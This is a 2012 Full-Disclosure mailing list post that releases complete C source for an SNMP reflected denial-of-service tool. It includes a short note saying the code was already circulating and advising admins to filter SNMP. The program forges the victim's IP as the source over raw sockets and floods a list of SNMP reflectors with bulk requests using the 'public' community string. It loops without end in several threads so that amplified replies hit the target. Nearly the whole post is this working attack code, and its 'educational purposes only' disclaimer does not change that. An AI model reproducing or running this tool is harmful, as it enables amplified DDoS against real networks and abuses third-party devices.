@@ -1,0 +1,271 @@
+
+Date: Thu, 30 Aug 2012 13:13:55 -0400
+From: Full Disclosure <full.disclosure@...dex.ru>
+To: full-disclosure@...ts.grok.org.uk
+Subject: SNMP Reflected Denial Of Service - PoC
+
+Hi list,
+
+I am releasing this code due to the fact that my dev server got hacked and people have been using it in the wild for bad things.
+
+Network admins should patch their networks appropriately by rejecting snmp connections from unwanted IPs.
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+/* For educational purposes only */
+/* The author of this code is not responsible for the use of this proof of concept tool */
+#include <stdio.h>
+#include <netinet/ip.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/udp.h>
+#include <string.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <sys/types.h>
+#include <asm/types.h>
+#include <pthread.h>
+
+//#define DEBUG  // uncomment if you want to see debugging messages
+#define MAXTHREADS 4 // Maximum number of threads
+#define SNMPPORT 161 // Destination SNMP port (default)
+
+const char payload[] = "\x30\x23\x02\x01\x01\x04\x06\x70\x75\x62\x6c\x69\x63\xa5\x16\x02\x02\x4e\x47"
+                       "\x02\x01\x00\x02\x02\x08\xca\x30\x09\x30\x07\x06\x03\x2b\x06\x01\x05\x00";
+
+struct iphdr ip_head;
+struct udphdr udp_head;
+struct sockaddr_in target;
+
+struct snmp_s {
+        unsigned int ip;
+        struct snmp_s *next;
+}snmp_s;
+
+struct snmp_s* first_s = NULL;
+
+ struct udp_pseudo        /*the udp pseudo header*/
+ {
+        unsigned int src_addr;
+        unsigned int dst_addr;
+        unsigned char  dummy;
+        unsigned char  proto;
+        unsigned short length;
+ } pseudohead;
+
+ struct help_checksum   /*struct for checksum calculation*/
+ {
+        struct udp_pseudo pshd;
+        struct udphdr udphd;
+ } udp_chk_construct;
+
+struct args {
+        int socket;
+        char *filename;
+        unsigned int srcip;
+        unsigned int dstip;
+}args;
+
+unsigned short in_cksum(unsigned short *addr,int len);
+void send_udp(int sfd,unsigned int src,unsigned short src_p,
+             unsigned int dst,unsigned short dst_p,char *buffer,int len);
+void *drdos();
+void add_snmp_s(void);
+int snmp_s_length(struct snmp_s* list);
+void push_ip(struct snmp_s** first_s_ref, unsigned int ip);
+
+unsigned short in_cksum(unsigned short *addr,int len)
+{
+        register int nleft=len;
+        register unsigned short *w=addr;
+        register int sum=0;
+        unsigned short answer=0;
+
+        while(nleft>1)
+         {
+          sum+=*w++;
+          nleft-=2;
+         }
+        if(nleft==1)
+         {
+          *(u_char *)(&answer)=*(u_char *)w;
+          sum+=answer;
+         }
+        sum=(sum >> 16)+(sum & 0xffff);
+        sum+=(sum >> 16);
+        answer=~sum;
+        return(answer);
+}
+
+void send_udp(int sfd,unsigned int src,unsigned short src_p,
+             unsigned int dst,unsigned short dst_p,char *buffer,int len)
+{
+        char *packet;
+
+        /*Prepare IP header*/
+        ip_head.id       = htons(rand() + (rand()%100));
+        ip_head.tot_len  = htons(sizeof(struct iphdr)+sizeof(struct udphdr)+len);
+        ip_head.saddr    = src;
+        ip_head.daddr    = dst;
+        ip_head.check    = in_cksum((unsigned short *)&ip_head,sizeof(struct iphdr));
+
+        /*Prepare UDP header*/
+        udp_head.source = htons(src_p);
+        udp_head.dest = htons(dst_p);
+        udp_head.check   = 0;
+
+        /*Assemble structure for checksum calculation and calculate checksum*/
+        pseudohead.src_addr=ip_head.saddr;
+        pseudohead.dst_addr=ip_head.daddr;
+        pseudohead.dummy=0;
+        pseudohead.proto=ip_head.protocol;
+        pseudohead.length=htons(sizeof(struct udphdr)+len);
+        udp_chk_construct.pshd=pseudohead;
+        udp_chk_construct.udphd=udp_head;
+        packet=malloc(sizeof(struct help_checksum)+len);
+        memcpy(packet,&udp_chk_construct,sizeof(struct help_checksum));
+        memcpy(packet+sizeof(struct help_checksum),buffer,len);
+        udp_head.check=in_cksum((unsigned short *)packet,sizeof(struct help_checksum)+len);
+        free(packet);
+
+        /*Assemble packet*/
+        packet=malloc(sizeof(struct iphdr)+sizeof(struct udphdr)+len);
+        memcpy(packet,(char *)&ip_head,sizeof(struct iphdr));
+        memcpy(packet+sizeof(struct iphdr),(char *)&udp_head,sizeof(struct udphdr));
+        memcpy(packet+sizeof(struct iphdr)+sizeof(struct udphdr),buffer,len);
+
+        /*Send packet*/
+        target.sin_family     = AF_INET;
+        target.sin_addr.s_addr= ip_head.daddr;
+        target.sin_port       = udp_head.source;
+        sendto(sfd,packet,sizeof(struct iphdr)+sizeof(struct udphdr)+len,0,(struct sockaddr *)&target,sizeof(struct sockaddr_in));
+        free(packet);
+}
+
+void *drdos(void) {
+        char* aline = calloc(16, sizeof(char) );
+
+        #ifdef DEBUG
+        unsigned long count = 0;
+        #endif
+
+        for(;;) {
+                struct snmp_s *current = first_s;
+
+                #ifdef DEBUG
+                printf("Attack in progress\n");
+                #endif
+
+                // read from linked list
+                while( current != NULL ) {
+                        args.dstip = current->ip;
+                        send_udp( args.socket, args.srcip, rand(), args.dstip, SNMPPORT, payload, sizeof(payload)-1 );
+                        current = current->next;
+
+                        #ifdef DEBUG
+                        count++;
+                        printf("Packets sent: %lu\n", count);
+                        #endif
+                }
+        }
+}
+
+void push_ip(struct snmp_s** snmp_s_ref, unsigned int ip) {
+        struct snmp_s* temp = malloc(sizeof(struct snmp_s));
+
+        temp->ip = ip;
+        temp->next = *snmp_s_ref;
+        *snmp_s_ref = temp;
+}
+
+void add_snmp_s(void) {
+        char* aline = calloc(16, sizeof(char) );
+
+        FILE* fp = fopen(args.filename, "r" );
+
+        if( fp == NULL) {
+                perror("Fatal error: ");
+        }
+
+        while ( !feof(fp) )
+        {
+                fscanf( fp, "%s\n", aline );
+                push_ip(&first_s, inet_addr(aline));
+                memset( aline, 0, 16 );
+        }
+        fclose(fp);
+
+        #ifdef DEBUG
+        int l = snmp_s_length(first_s);
+        printf("Built linked list from file.\n");
+        printf("Nodes: %d\n", l);
+        #endif
+}
+
+int snmp_s_length(struct snmp_s* list) {
+        struct snmp_s *current = list;
+        int count = 0;
+
+        while( current != NULL ) {
+                count++;
+                current = current->next;
+        }
+        return count;
+}
+
+int main(int argc, char *argv[]) {
+        char *data;
+        int t=0;
+        int j=0;
+
+        // threads
+        pthread_t thread_id[MAXTHREADS];
+
+        data=malloc(sizeof(payload)+sizeof(payload)-1);
+        memcpy(data, payload, sizeof(payload)-1);
+
+        if(argc < 3) {
+                printf("Usage: %s <target ip> <reflectors list>\n", argv[0]);
+                exit(1);
+        }
+
+        if((args.socket=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0)  /*open sending socket*/
+        {
+                perror("socket");
+                exit(1);
+        }
+
+         /*Prepare IP header (static data)*/
+         ip_head.ihl      = 5;     /*headerlength with no options*/
+         ip_head.version  = 4;
+         ip_head.tos      = 22;
+         ip_head.frag_off = 0;
+         ip_head.ttl      = 255;
+         ip_head.protocol = IPPROTO_UDP;
+         ip_head.check    = 0;    /*Must be zero for checksum calculation*/
+
+        /* Prepare UDP header*/
+         udp_head.len   = htons(sizeof(struct udphdr)+sizeof(payload)-1);
+
+        args.srcip = inet_addr(argv[1]);
+        args.filename = argv[2];
+
+        // Read file and save the IPs in a linked list.
+        add_snmp_s();
+
+        // Create threads
+        for(t=0; t<MAXTHREADS; t++) {
+                pthread_create(&thread_id[t], NULL, &drdos, NULL);
+        }
+
+        for(j=0; j<MAXTHREADS; j++) {
+                pthread_join(&thread_id[j], NULL);
+        }
+
+        return 0;
+}
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+Hosted and sponsored by Secunia - http://secunia.com/
